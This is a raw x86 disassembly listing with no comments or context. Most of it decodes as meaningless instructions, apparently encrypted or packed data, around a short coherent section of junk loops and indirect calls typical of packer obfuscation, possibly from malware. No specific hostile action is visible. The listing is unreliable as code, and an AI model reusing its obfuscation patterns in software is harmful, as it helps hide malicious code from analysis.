  411e79:	sub    DWORD PTR [edi+0x4c],esp
  411e7c:	inc    eax
  411e7d:	sub    BYTE PTR [eax],dh
  411e7f:	imul   ebp,ebx,0x7c
  411e82:	loopne 0x411e22
  411e84:	jle    0x411e74
  411e86:	retf   
  411e87:	fs xchg eax,esp
  411e8a:	inc    esi
  411e8b:	sub    cl,BYTE PTR [eax]
  411e8d:	fisub  WORD PTR [edx+edi*4]
  411e90:	jg     0x411e68
  411e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e93:	in     eax,0x78
  411e95:	(bad)  
  411e96:	outs   dx,BYTE PTR ds:[esi]
  411e97:	sub    BYTE PTR [eax],0x79
  411e9a:	and    edi,esi
  411e9c:	mov    gs,WORD PTR [esi-0x1e7744ae]
  411ea2:	fld    QWORD PTR [eax+0x5024a058]
  411ea8:	or     dh,BYTE PTR [esi+ebx*2+0x6c]
  411eac:	(bad)  
  411ead:	(bad)  
  411eae:	mov    esi,0x878255a8
  411eb3:	mov    eax,0x1f808c3d
  411eb8:	cmc    
  411eb9:	arpl   WORD PTR [esi+eax*4],cx
  411ebc:	fwait
  411ebd:	out    0xb2,al
  411ebf:	sahf   
  411ec0:	pop    ds
  411ec1:	push   DWORD PTR [edx-0x7b407164]
  411ec7:	shr    DWORD PTR [ecx+0x1fe7eb9d],cl
  411ecd:	iret   
  411ece:	(bad)  
  411ecf:	jp     0x411e81
  411ed1:	mov    DWORD PTR [ebx],esi
  411ed3:	loopne 0x411efa
  411ed5:	inc    esi
  411ed6:	push   eax
  411ed7:	sbb    eax,DWORD PTR [ebp+0x71bc7b04]
  411edd:	int3   
  411ede:	jne    0x411efb
  411ee0:	sub    BYTE PTR [ecx-0x36],al
  411ee3:	pop    ss
  411ee4:	je     0x411f38
  411ee6:	sar    BYTE PTR ds:0x397d36a0,cl
  411eec:	jb     0x411f0f
  411eee:	jne    0x411e88
  411ef0:	xor    DWORD PTR [edi+0x734f36ea],0x33fe9864
  411efa:	cmp    esp,DWORD PTR ds:0xfcf3b4c4
  411f00:	imul   edx,esp,0x56
  411f03:	pop    edi
  411f04:	inc    edi
  411f05:	les    edx,FWORD PTR [esi]
  411f07:	cli    
  411f08:	or     DWORD PTR [esi+edx*1+0x3b2feb27],0x4c
  411f10:	imul   esp,DWORD PTR [ebx+0x55],0xab33c176
  411f17:	sbb    ebx,edx
  411f19:	rcr    DWORD PTR [ecx],1
  411f1b:	popfw  
  411f1d:	sbb    dl,BYTE PTR [ebp-0x68e1c717]
  411f23:	mov    bh,0x68
  411f25:	pop    esp
  411f26:	mov    ebp,0x39da6482
  411f2b:	imul   ebp,DWORD PTR [edi-0x58],0xffffff80
  411f2f:	or     ebp,ebp
  411f31:	ja     0x411f14
  411f33:	rcl    DWORD PTR [ebx+0x2e1c29b5],1
  411f39:	push   cs
  411f3a:	orps   xmm5,XMMWORD PTR [ecx+0x62]
  411f3e:	bound  ebx,QWORD PTR [ebx+0x38]
  411f41:	shl    esi,cl
  411f43:	fimul  DWORD PTR [ecx-0x44]
  411f46:	mov    DWORD PTR [edi-0x47ad0b7a],ebp
  411f4c:	out    0x9e,eax
  411f4e:	out    dx,eax
  411f4f:	imul   esi,edx,0x1b86be6d
  411f55:	rol    DWORD PTR [esp+ecx*2],0xc2
  411f59:	addr16 retf 
  411f5b:	clc    
  411f5c:	mov    bl,0x4a
  411f5e:	mov    esp,0x9782edf7
  411f63:	(bad)  
  411f64:	sub    al,0xac
  411f66:	and    al,0xaf
  411f68:	test   eax,0x5dd9536f
  411f6d:	jmp    0xe56e:0xc8b32a34
  411f74:	sbb    al,0x4b
  411f76:	xor    eax,0x92ce1fe0
  411f7b:	mov    gs,WORD PTR [esi-0x15faff48]
  411f81:	cmp    ebp,esi
  411f83:	inc    ax
  411f85:	cmp    DWORD PTR [edx+0x2],eax
  411f88:	or     ecx,ebp
  411f8a:	cmp    DWORD PTR [ebp-0x5048be00],ecx
  411f90:	jge    0x411f17
  411f92:	loop   0x411fdb
  411f94:	stc    
  411f95:	les    edx,FWORD PTR [ecx-0x61]
  411f98:	std    
  411f99:	lods   al,BYTE PTR ds:[esi]
  411f9a:	xchg   esi,eax
  411f9b:	sti    
  411f9c:	adc    edx,ebp
  411f9e:	aas    
  411f9f:	in     eax,dx
  411fa0:	aad    0x76
  411fa2:	pop    ebx
  411fa3:	not    BYTE PTR [esi-0x10]
  411fa6:	shl    DWORD PTR [ebp+0x29f23875],0x4b
  411fad:	ficom  DWORD PTR [eax+edi*1-0x5b]
  411fb1:	pop    DWORD PTR [eax+0x77]
  411fb4:	pop    esi
  411fb5:	xchg   ebp,eax
  411fb6:	jle    0x412012
  411fb8:	cs push ebp
  411fba:	xchg   ecx,eax
  411fbb:	in     eax,dx
  411fbc:	(bad)  
  411fbd:	or     eax,esp
  411fbf:	scas   eax,DWORD PTR es:[edi]
  411fc0:	cwde   
  411fc1:	loopne 0x411fe2
  411fc3:	mov    esi,esi
  411fc5:	xor    al,0x95
  411fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc8:	(bad)  
  411fc9:	sbb    al,0x6b
  411fcb:	push   edi
  411fcc:	lods   eax,DWORD PTR ds:[esi]
  411fcd:	int3   
  411fce:	mov    ebp,0x45e18aa7
  411fd3:	lods   al,BYTE PTR ds:[esi]
  411fd4:	std    
  411fd5:	out    dx,eax
  411fd6:	push   ebx
  411fd7:	jge    0x411f90
  411fd9:	repnz shr DWORD PTR [eax+0x28d6582d],0xf
  411fe1:	scas   eax,DWORD PTR es:[edi]
  411fe2:	pop    eax
  411fe3:	cdq    
  411fe4:	adc    al,0x3a
  411fe6:	sbb    esi,DWORD PTR [edi-0x70]
  411fe9:	inc    esp
  411fea:	mov    ah,0x7c
  411fec:	scas   al,BYTE PTR es:[edi]
  411fed:	aas    
  411fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fef:	jo     0x411fdf
  411ff1:	loopne 0x411fbb
  411ff3:	sub    BYTE PTR [esi+0x1f],dh
  411ff6:	ins    BYTE PTR es:[edi],dx
  411ff7:	dec    ecx
  411ff8:	mov    ?,ebp
  411ffa:	push   eax
  411ffb:	xlat   BYTE PTR ds:[ebx]
  411ffc:	xor    al,dl
  411ffe:	loopne 0x41202a
  412000:	cmp    ebx,ebx
  412002:	inc    edx
  412003:	push   esp
  412004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412005:	loope  0x411fed
  412007:	pop    ebx
  412008:	xchg   ecx,eax
  412009:	(bad)  
  41200a:	pop    ebp
  41200b:	fnsave [ebp-0x4fd1e000]
  412011:	rol    DWORD PTR [ecx*2+0x3f356b66],cl
  412018:	pshufw mm1,QWORD PTR [ebp+0x49695c4f],0xe0
  412020:	mov    ch,0xba
  412022:	jo     0x411fcb
  412024:	mov    ds,WORD PTR [ecx]
  412026:	dec    edi
  412027:	(bad)  
  412028:	fdiv   st(5),st
  41202a:	and    al,0x51
  41202c:	fst    DWORD PTR [ebp+edi*8-0x1f]
  412030:	(bad)  
  412031:	repz jecxz 0x411fec
  412034:	mov    eax,ds:0x5b647e
  412039:	ret    
  41203a:	jae    0x41201e
  41203c:	xor    al,0x9e
  41203e:	ss inc ebp
  412040:	out    dx,al
  412041:	mov    cl,0xe4
  412043:	or     BYTE PTR [eax-0x3a],cl
  412046:	push   0x2b
  412048:	jo     0x41209f
  41204a:	and    bh,BYTE PTR [esi+ebx*1]
  41204d:	sub    ecx,DWORD PTR ds:[ecx-0x54]
  412051:	jmp    0x78ec13da
  412056:	jb     0x412035
  412058:	ds call 0xb896f89a
  41205e:	daa    
  41205f:	popf   
  412060:	ins    BYTE PTR es:[edi],dx
  412061:	inc    eax
  412062:	pop    eax
  412063:	jbe    0x412007
  412065:	rcr    BYTE PTR [edi+0x4699dd42],0x82
  41206c:	pop    ecx
  41206d:	cs cmp eax,0x6c6d65c6
  412073:	imul   ecx,DWORD PTR [ecx-0x67],0x133c0157
  41207a:	fnstenv [eax-0x27]
  41207d:	ret    
  41207e:	mov    bl,0x54
  412080:	enter  0xc54,0xb3
  412084:	add    bl,BYTE PTR [eax]
  412086:	ins    BYTE PTR es:[edi],dx
  412087:	mov    ebp,0x294a2e1d
  41208c:	push   esp
  41208d:	(bad)  
  41208e:	mov    WORD PTR [edi+eiz*4+0x16314595],fs
  412095:	xchg   edx,esi
  412097:	rep lods al,BYTE PTR ds:[esi]
  412099:	inc    ecx
  41209a:	and    BYTE PTR [eax+esi*8-0x2cfa0235],0xbf
  4120a2:	add    edx,ebx
  4120a4:	scas   al,BYTE PTR es:[edi]
  4120a5:	xor    edi,DWORD PTR [eax-0x62]
  4120a8:	adc    eax,0xe25ba46d
  4120ad:	les    esi,FWORD PTR [ecx-0x49cc0699]
  4120b3:	ins    DWORD PTR es:[edi],dx
  4120b4:	sub    eax,0xa29c879d
  4120b9:	jmp    0x4120f7
  4120bb:	aas    
  4120bc:	add    bh,BYTE PTR [edi+0x3b]
  4120bf:	xor    BYTE PTR [edi],cl
  4120c1:	inc    esi
  4120c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c3:	mov    ds:0xf268711c,eax
  4120c8:	mov    esi,0xa194d923
  4120cd:	add    al,0x7d
  4120cf:	xchg   esp,eax
  4120d0:	jns    0x41209b
  4120d2:	dec    ecx
  4120d3:	(bad)  
  4120d4:	cmp    al,BYTE PTR ds:0x6016844
  4120da:	(bad)  
  4120db:	lock cs inc edx
  4120de:	pop    ds
  4120df:	or     eax,0xd8d6282a
  4120e4:	mov    ecx,0xb2baec48
  4120e9:	loope  0x412120
  4120eb:	bound  esi,QWORD PTR [edi+0x7e5643e0]
  4120f1:	pop    eax
  4120f2:	pop    edi
  4120f3:	xchg   esi,eax
  4120f4:	out    dx,eax
  4120f5:	mov    ebp,0x4e4ca3b8
  4120fa:	(bad)  
  4120fb:	mov    dl,0xc
  4120fd:	rcl    ebp,1
  4120ff:	inc    ebp
  412100:	dec    ebx
  412101:	dec    ecx
  412102:	dec    esi
  412103:	jmp    0x4120a3
  412105:	ins    DWORD PTR es:[edi],dx
  412106:	mov    ds:0x323aed68,eax
  41210b:	push   ecx
  41210c:	lods   al,BYTE PTR ds:[esi]
  41210d:	loope  0x412163
  41210f:	out    dx,al
  412110:	in     eax,dx
  412111:	or     al,BYTE PTR [edi]
  412113:	test   esi,ebp
  412115:	les    edx,FWORD PTR [ecx]
  412117:	ret    
  412118:	xchg   ebp,eax
  412119:	xor    eax,0xa58f9f80
  41211e:	pushf  
  41211f:	push   ecx
  412120:	outs   dx,BYTE PTR ds:[esi]
  412121:	mov    ecx,0x2ac1ead2
  412126:	(bad)  
  412127:	repz pusha 
  412129:	and    BYTE PTR [ebx-0x3aa2e033],ah
  41212f:	or     al,0xb2
  412131:	enter  0xcc91,0xb0
  412135:	jnp    0x412113
  412137:	lock in al,0xf8
  41213a:	cmp    eax,0xb17dba5
  41213f:	push   edi
  412140:	sbb    bh,BYTE PTR [ebp-0x30]
  412143:	pop    eax
  412144:	mov    cl,0x84
  412146:	push   0x66
  412148:	arpl   WORD PTR [edx],bx
  41214a:	ins    DWORD PTR es:[edi],dx
  41214b:	dec    ebp
  41214c:	das    
  41214d:	out    0x7c,eax
  41214f:	inc    eax
  412150:	sub    ebp,DWORD PTR [ebx+ebx*8]
  412153:	icebp  
  412154:	lock fwait
  412156:	and    eax,0x960c9482
  41215b:	sub    BYTE PTR [ebx-0x67d82e49],bh
  412161:	xor    ch,bl
  412163:	sub    BYTE PTR [edi+0x4ba08830],ch
  412169:	dec    edi
  41216a:	push   edi
  41216b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41216c:	sub    eax,0xde25217a
  412171:	add    eax,0xf32b01e
  412176:	int    0x4f
  412178:	xchg   edi,eax
  412179:	cmp    eax,0x8c449ece
  41217e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217f:	sbb    al,0xf2
  412181:	push   edi
  412182:	repz sahf 
  412184:	or     ah,BYTE PTR [ecx+0x74]
  412187:	dec    ebx
  412188:	xor    edi,DWORD PTR [eax+0x26]
  41218b:	jl     0x41214f
  41218d:	out    0xc5,eax
  41218f:	mov    al,0x4d
  412191:	fwait
  412192:	popf   
  412193:	fstp   DWORD PTR [eax]
  412195:	je     0x4121b3
  412197:	jae    0x412211
  412199:	mov    eax,0x24b73d4
  41219e:	push   0xdad341d5
  4121a3:	adc    BYTE PTR [esi+0x39],0x77
  4121a7:	xor    cl,cl
  4121a9:	pop    eax
  4121aa:	imul   esp,DWORD PTR [ebp+eax*4+0x44],0x4c
  4121af:	adc    esp,eax
  4121b1:	sbb    ecx,edi
  4121b3:	test   eax,0x2fa42efe
  4121b8:	cdq    
  4121b9:	push   ds
  4121ba:	mov    ecx,0x93c0e9ad
  4121bf:	xor    edx,ebp
  4121c1:	sub    ebx,ebx
  4121c3:	jp     0x412186
  4121c5:	sbb    BYTE PTR [edx-0x4e62914c],bh
  4121cb:	mov    esi,0x83aebcd
  4121d0:	fiadd  DWORD PTR [edx-0x27]
  4121d3:	jmp    0x41219b
  4121d5:	xor    bh,BYTE PTR [ebx+0x1]
  4121d8:	add    edi,DWORD PTR [ebx]
  4121da:	push   esp
  4121db:	or     bh,BYTE PTR [esi-0x3eb187db]
  4121e1:	mov    al,0xc
  4121e3:	pop    ss
  4121e4:	lahf   
  4121e5:	fwait
  4121e6:	jle    0x41225d
  4121e8:	ja     0x412179
  4121ea:	jl     0x41219c
  4121ec:	sbb    ebx,DWORD PTR ds:0x946daec8
  4121f2:	lods   al,BYTE PTR ds:[esi]
  4121f3:	ret    0x1036
  4121f6:	adc    ebp,DWORD PTR [eax-0x68790e03]
  4121fc:	iret   
  4121fd:	out    dx,eax
  4121fe:	mov    ah,0xec
  412200:	pop    ebp
  412201:	or     edi,esp
  412203:	push   es
  412204:	and    al,0xbf
  412206:	test   al,0x96
  412208:	or     edi,DWORD PTR [edi-0x3993126c]
  41220e:	mov    edi,0xfbe392e5
  412213:	dec    edi
  412214:	stos   DWORD PTR es:[edi],eax
  412215:	rol    cl,0xf5
  412218:	adc    BYTE PTR [ecx-0x72],bl
  41221b:	dec    ebp
  41221c:	lock (bad) 
  41221e:	(bad)  
  41221f:	sbb    BYTE PTR [eax-0x5c],ah
  412222:	add    BYTE PTR [ebp+0x1201c59f],ah
  412228:	ror    ah,1
  41222a:	stc    
  41222b:	sahf   
  41222c:	emms   
  41222e:	or     edi,DWORD PTR cs:[edi+0x2d]
  412232:	jnp    0x41225d
  412234:	popa   
  412235:	mov    ds:0xf86df554,eax
  41223a:	cmp    esp,DWORD PTR [ecx-0x5ca0c2ae]
  412240:	xor    bl,BYTE PTR [ecx]
  412242:	jecxz  0x412248
  412244:	cwde   
  412245:	inc    edi
  412246:	(bad)  
  412247:	cwde   
  412248:	les    edx,FWORD PTR [ecx]
  41224a:	cmp    eax,ebp
  41224c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41224d:	mov    al,ds:0x4d3367e1
  412252:	imul   edx,ecx,0xcbe05853
  412258:	lahf   
  412259:	js     0x4122c2
  41225b:	sbb    DWORD PTR [ecx],edx
  41225d:	pop    esp
  41225e:	jmp    0x4122cd
  412260:	arpl   WORD PTR [eax+edx*8+0x525f4ef8],bp
  412267:	imul   eax,edx,0xffffffac
  41226a:	cmp    ebp,0x67
  41226d:	js     0x412260
  41226f:	mov    ebp,DWORD PTR [edi]
  412271:	add    esi,DWORD PTR [esi+0x445989ad]
  412277:	mov    ds:0x4dada5ad,eax
  41227c:	dec    esp
  41227d:	mov    eax,0x7120e974
  412282:	cli    
  412283:	lds    ecx,FWORD PTR [edx+ebx*1+0x1b]
  412287:	jnp    0x4122ed
  412289:	jo     0x41224c
  41228b:	(bad)  
  41228c:	shl    BYTE PTR [edx*8+0x181b5dce],1
  412293:	or     edx,DWORD PTR [esi]
  412295:	test   al,0xde
  412297:	int    0x78
  412299:	mov    ch,0x60
  41229b:	pop    esi
  41229c:	div    ch
  41229e:	call   0x3ec4e934
  4122a3:	(bad)  
  4122a4:	xor    esp,DWORD PTR ds:0x7034378f
  4122aa:	cmp    edi,ecx
  4122ac:	je     0x4122d3
  4122ae:	mov    dh,0xa9
  4122b0:	retf   0x7959
  4122b3:	fsubr  QWORD PTR [eax]
  4122b5:	jae    0x412241
  4122b7:	dec    esp
  4122b8:	pop    edi
  4122b9:	xchg   esi,eax
  4122ba:	call   0x31fb:0xd88a5df7
  4122c1:	stos   BYTE PTR es:[edi],al
  4122c2:	jnp    0x41229b
  4122c4:	sbb    al,0x88
  4122c6:	xchg   edx,eax
  4122c7:	popa   
  4122c8:	psubsw mm3,QWORD PTR [edx-0x776783ef]
  4122cf:	cmp    DWORD PTR [eax+0x2828dfa4],ebp
  4122d5:	aam    0xa
  4122d7:	add    bl,ah
  4122d9:	ds mov edx,0xeb63c8d2
  4122df:	out    0xa9,eax
  4122e1:	mov    ?,WORD PTR [esi+0x16d5e6e8]
  4122e7:	xchg   bh,ch
  4122e9:	inc    eax
  4122ea:	add    eax,0x5844e385
  4122ef:	int    0x37
  4122f1:	xor    eax,0x11b8bffd
  4122f6:	cld    
  4122f7:	fistp  DWORD PTR [ebp-0x7f186fa9]
  4122fd:	test   al,0x15
  4122ff:	push   esi
  412300:	shl    BYTE PTR [esi+0x30584562],0xef
  412307:	imul   esi,DWORD PTR [ebp+0x79],0x1867347
  41230e:	mov    ds:0xf1c3de8e,al
  412313:	inc    ebp
  412314:	adc    esi,ebp
  412316:	xor    DWORD PTR [ecx],edx
  412318:	cli    
  412319:	jae    0x412356
  41231b:	(bad)  
  41231c:	das    
  41231d:	retf   0x6370
  412320:	jae    0x4122d5
  412322:	mov    eax,ds:0x9a532b79
  412327:	xor    BYTE PTR [ebx+0x362fc008],ah
  41232d:	addr16 add eax,0x812ec4d8
  412333:	stc    
  412334:	je     0x41234d
  412336:	fsub   DWORD PTR [ebx]
  412338:	int    0x6a
  41233a:	js     0x412392
  41233c:	test   al,0xa
  41233e:	js     0x4122fc
  412340:	fiadd  DWORD PTR [ebx-0xa]
  412343:	push   0x50
  412345:	dec    ecx
  412346:	or     eax,edi
  412348:	or     dl,BYTE PTR [edx+eax*8+0x25bc6c53]
  41234f:	mov    dh,0xd2
  412351:	add    edx,DWORD PTR [ebx-0x12d2ad1a]
  412357:	(bad)  
  412358:	out    dx,al
  412359:	mov    edx,DWORD PTR [ebp+0x8]
  41235c:	and    DWORD PTR ds:0x42b21a,0x0
  412366:	jmp    0x41237a
  41236b:	xor    ebx,ebx
  41236d:	xor    ebx,DWORD PTR ds:0x42b21a
  412373:	inc    ebx
  412374:	mov    DWORD PTR ds:0x42b21a,ebx
  41237a:	cmp    DWORD PTR ds:0x42b21a,0x18
  412381:	jae    0x4123c1
  412387:	cmp    DWORD PTR ds:0x42b21a,0x4
  41238e:	jg     0x4123c1
  412394:	jmp    0x4123a2
  412399:	push   DWORD PTR [ebp-0x18]
  41239c:	call   DWORD PTR ds:0x42b316
  4123a2:	cmp    DWORD PTR ds:0x42b21a,0x3
  4123a9:	jne    0x4123bc
  4123af:	mov    ebx,DWORD PTR ds:0x42b21a
  4123b5:	inc    ebx
  4123b6:	mov    DWORD PTR ds:0x42b21a,ebx
  4123bc:	jmp    0x41236b
  4123c1:	mov    ebx,DWORD PTR [ebp-0x54]
  4123c4:	mov    DWORD PTR ds:0x42b21a,0x6966
  4123ce:	add    edx,0x64f880
  4123d4:	or     edx,ebx
  4123d6:	mov    DWORD PTR [ebp-0x54],edx
  4123d9:	mov    edx,DWORD PTR [ebp+0x8]
  4123dc:	xor    DWORD PTR ds:0x42b1b2,edx
  4123e2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123e5:	and    DWORD PTR ds:0x42b226,0x42b18e
  4123ef:	add    edx,ecx
  4123f1:	sbb    DWORD PTR ds:0x42b1ee,0x42b196
  4123fb:	xor    edx,ebx
  4123fd:	mov    DWORD PTR [ebp-0x50],edx
  412400:	mov    DWORD PTR ds:0x42b226,0x2b16
  41240a:	mov    edx,DWORD PTR [ebp+0x8]
  41240d:	and    DWORD PTR ds:0x42b19e,0x0
  412417:	mov    ebx,DWORD PTR ds:0x42b19e
  41241d:	inc    ebx
  41241e:	mov    DWORD PTR ds:0x42b19e,ebx
  412424:	cmp    DWORD PTR ds:0x42b19e,0xc
  41242b:	ja     0x41246b
  412431:	jmp    0x412444
  412436:	push   DWORD PTR [ebp-0x10]
  412439:	push   0x7c16
  41243e:	call   DWORD PTR ds:0x42b31a
  412444:	cmp    DWORD PTR ds:0x42b19e,0xb
  41244b:	jne    0x41245e
  412451:	mov    ebx,DWORD PTR ds:0x42b19e
  412457:	inc    ebx
  412458:	mov    DWORD PTR ds:0x42b19e,ebx
  41245e:	cmp    DWORD PTR ds:0x42b19e,0x13
  412465:	jb     0x412417
  41246b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41246e:	add    edx,edi
  412470:	and    edx,ebx
  412472:	mov    ebx,DWORD PTR ds:0x42b206
  412478:	add    DWORD PTR ds:0x42b1c6,ebx
  41247e:	mov    DWORD PTR [ebp-0x4c],edx
  412481:	add    DWORD PTR ds:0x42b19a,0x5c82
  41248b:	mov    edx,DWORD PTR [ebp+0x8]
  41248e:	mov    ebx,DWORD PTR [ebp-0x48]
  412491:	lea    edx,[ebx+edx*1+0x241fcdf]
  412498:	mov    DWORD PTR [ebp-0x48],edx
  41249b:	mov    edx,DWORD PTR [ebp+0x8]
  41249e:	mov    ebx,0xfa5e1524
  4124a3:	sub    ebx,edx
  4124a5:	add    ebx,DWORD PTR [ebp-0x44]
  4124a8:	mov    DWORD PTR [ebp-0x44],ebx
  4124ab:	mov    edx,DWORD PTR [ebp+0x8]
  4124ae:	xor    edx,eax
  4124b0:	add    edx,esi
  4124b2:	jne    0x40fdfa
  4124b8:	jmp    0x419191
  4124bd:	mov    edx,DWORD PTR [ebp-0xc]
  4124c0:	sub    edx,esi
  4124c2:	xor    edx,eax
  4124c4:	mov    DWORD PTR [ebp-0x5c],edx
  4124c7:	mov    edx,DWORD PTR [ebp-0x10]
  4124ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4124cd:	xor    edx,eax
  4124cf:	xor    ebx,eax
  4124d1:	sub    edx,ebx
  4124d3:	sub    edx,esi
  4124d5:	xor    edx,eax
  4124d7:	mov    DWORD PTR [ebp-0x10],edx
  4124da:	mov    edx,DWORD PTR [ebp-0x14]
  4124dd:	mov    DWORD PTR [ebp+0x8],edx
  4124e0:	jmp    0x4148b5
  4124e5:	mov    edx,DWORD PTR [ebp+0x8]
  4124e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4124eb:	xor    edx,eax
  4124ed:	xor    ebx,eax
  4124ef:	sub    edx,ebx
  4124f1:	sub    edx,esi
  4124f3:	xor    edx,eax
  4124f5:	mov    DWORD PTR [ebp+0x8],edx
  4124f8:	mov    edx,DWORD PTR [ebp+0x8]
  4124fb:	mov    ebx,DWORD PTR [ebp-0x58]
  4124fe:	add    edx,0x5708e2
  412504:	imul   edx,ebx
  412507:	mov    DWORD PTR [ebp-0x58],edx
  41250a:	mov    edx,DWORD PTR [ebp+0x8]
  41250d:	mov    ebx,DWORD PTR [ebp-0x54]
  412510:	add    edx,0x64f880
  412516:	or     edx,ebx
  412518:	mov    DWORD PTR [ebp-0x54],edx
  41251b:	mov    edx,DWORD PTR [ebp+0x8]
  41251e:	mov    ebx,DWORD PTR [ebp-0x50]
  412521:	add    edx,ecx
  412523:	xor    edx,ebx
  412525:	mov    DWORD PTR [ebp-0x50],edx
  412528:	mov    edx,DWORD PTR [ebp+0x8]
  41252b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41252e:	add    edx,edi
  412530:	and    edx,ebx
  412532:	mov    DWORD PTR [ebp-0x4c],edx
  412535:	mov    edx,DWORD PTR [ebp+0x8]
  412538:	mov    ebx,DWORD PTR [ebp-0x48]
  41253b:	lea    edx,[ebx+edx*1+0x241fcdf]
  412542:	mov    DWORD PTR [ebp-0x48],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,0xfa5e1524
  41254d:	sub    ebx,edx
  41254f:	add    ebx,DWORD PTR [ebp-0x44]
  412552:	mov    DWORD PTR [ebp-0x44],ebx
  412555:	jmp    0x4148b5
  41255a:	xlat   BYTE PTR ds:[ebx]
  41255b:	push   ss
  41255c:	xchg   BYTE PTR [ebx-0x7e],dh
  41255f:	repz xchg edx,eax
  412561:	add    BYTE PTR [eax-0x49],0xdb
  412565:	div    BYTE PTR [esp+ebp*1-0x25]
  412569:	mov    ecx,0x83838afa
  41256e:	ds pop esi
  412570:	add    DWORD PTR [ebx-0x5e507294],0xffffffed
  412577:	add    ah,0x22
  41257a:	or     al,0x41
  41257c:	outs   dx,BYTE PTR ds:[esi]
  41257d:	lea    esp,[edi+edi*8]
  412580:	add    ah,bh
  412582:	mov    ch,0xe9
  412584:	mov    ?,WORD PTR [esi+edi*1-0x2b20ee50]
  41258b:	repnz ins DWORD PTR es:[edi],dx
  41258d:	loopne 0x4125f4
  41258f:	xor    BYTE PTR [ecx+0x6149eb89],bl
  412595:	rcr    DWORD PTR [eax+0x67],cl
  412598:	cmp    esp,DWORD PTR [esp+ecx*2-0x5d]
  41259c:	xor    ch,BYTE PTR [ebx+0x1a]
  41259f:	mov    dl,BYTE PTR [eax]
  4125a1:	jecxz  0x4125d0
  4125a3:	cs stos BYTE PTR es:[edi],al
  4125a5:	retf   0xf700
  4125a8:	push   es
  4125a9:	fcmovnb st,st(0)
  4125ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ac:	fdiv   st(3),st
  4125ae:	icebp  
  4125af:	bound  esp,QWORD PTR [edx-0x9]
  4125b2:	jno    0x412629
  4125b4:	ds lahf 
  4125b6:	xchg   ebp,eax
  4125b7:	mov    ds:0x6cf01ebe,eax
  4125bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125bd:	arpl   WORD PTR [ebx+0x41c50c79],cx
  4125c3:	test   eax,0xc2898bee
  4125c8:	shl    BYTE PTR [esp+ebp*4+0x46b8b2b1],0xd0
  4125d0:	lds    edi,FWORD PTR [esi-0x6]
  4125d3:	sar    edx,cl
  4125d5:	in     eax,0x3d
  4125d7:	add    BYTE PTR [ebx-0x21],dl
  4125da:	fdiv   st(0),st
  4125dc:	(bad)  
  4125dd:	push   esi
  4125de:	rcl    BYTE PTR [eax-0x19],cl
  4125e1:	shr    bh,0x3c
  4125e4:	mov    dl,0x3d
  4125e6:	or     DWORD PTR [esi+0x7c],ebx
  4125e9:	pop    eax
  4125ea:	sub    al,0xf3
  4125ec:	fimul  WORD PTR ds:0xa1aa9bd1
  4125f2:	jns    0x4125a8
  4125f4:	mov    eax,ds:0x8afb6d80
  4125f9:	jg     0x412640
  4125fb:	sub    eax,0xb5e6a0fb
  412600:	xchg   esp,eax
  412601:	mov    esp,0x5c193127
  412606:	sub    DWORD PTR [edi],edi
  412608:	adc    eax,0xd923aa14
  41260d:	ret    0xd425
  412610:	inc    ebp
  412611:	rcl    BYTE PTR [edi],0x24
  412614:	bound  dx,DWORD PTR [ecx]
  412617:	lahf   
  412618:	stc    
  412619:	out    0x66,al
  41261b:	not    ch
  41261d:	cmp    al,0x4e
  41261f:	fsub   st(5),st
  412621:	ins    DWORD PTR es:[edi],dx
  412622:	push   es
  412623:	jb     0x41268c
  412625:	jne    0x4125fc
  412627:	mov    al,0xca
  412629:	sub    esp,DWORD PTR [edi-0x9]
  41262c:	es (bad) 
  41262e:	lahf   
  41262f:	sbb    BYTE PTR ds:0x5e4a6b95,bl
  412635:	aad    0x88
  412637:	jmp    0x412653
  412639:	test   BYTE PTR [edi-0x46],cl
  41263c:	stos   BYTE PTR es:[edi],al
  41263d:	inc    edx
  41263e:	clc    
  41263f:	fstp   DWORD PTR es:[eax]
  412642:	pop    ss
  412643:	push   edx
  412644:	jmp    0xba47e7ce
  412649:	push   es
  41264a:	ret    
  41264b:	inc    ebp
  41264c:	enter  0xbd3e,0xe9
  412650:	and    eax,0x85459240
  412655:	fld    TBYTE PTR [esi+0x1754d28d]
  41265b:	xchg   BYTE PTR [edi-0x43],ch
  41265e:	jl     0x41262a
  412660:	(bad)  
  412661:	nop
  412662:	rol    DWORD PTR [ecx+0x50d62307],cl
  412668:	mov    edx,0x8bb02dab
  41266d:	mov    ebx,0xb7fedb9
  412672:	fst    QWORD PTR [edi-0x7984ad22]
  412678:	cmp    eax,0xe5916dcb
  41267d:	(bad)  [edx-0x5b]
  412680:	pop    esp
  412681:	cdq    
  412682:	lahf   
  412683:	int    0x2e
  412685:	lock in eax,dx
  412687:	in     al,dx
  412688:	sbb    BYTE PTR [esp+eax*4+0x31],ah
  41268c:	fmul   st(4),st
  41268e:	test   al,0x3a
  412690:	pop    esi
  412691:	mov    ecx,0xebf749a8
  412696:	retf   
  412697:	imul   BYTE PTR [edi+eiz*8+0x6a3d1f03]
  41269e:	cwde   
  41269f:	fs out dx,al
  4126a1:	or     DWORD PTR [edx+eax*2+0x39],ebp
  4126a5:	jnp    0x4126cf
  4126a7:	cmp    bh,BYTE PTR [edx-0x1c]
  4126aa:	pop    edi
  4126ab:	je     0x41263f
  4126ad:	in     eax,0x8c
  4126af:	xchg   DWORD PTR [edi-0x3b9774dc],ecx
  4126b5:	xchg   DWORD PTR [ebx-0x10],ebp
  4126b8:	iret   
  4126b9:	xchg   edi,eax
  4126ba:	sti    
  4126bb:	stos   BYTE PTR es:[edi],al
  4126bc:	sub    DWORD PTR [edx+0x7f],esp
  4126bf:	stos   DWORD PTR es:[edi],eax
  4126c0:	inc    ebx
  4126c1:	cld    
  4126c2:	aaa    
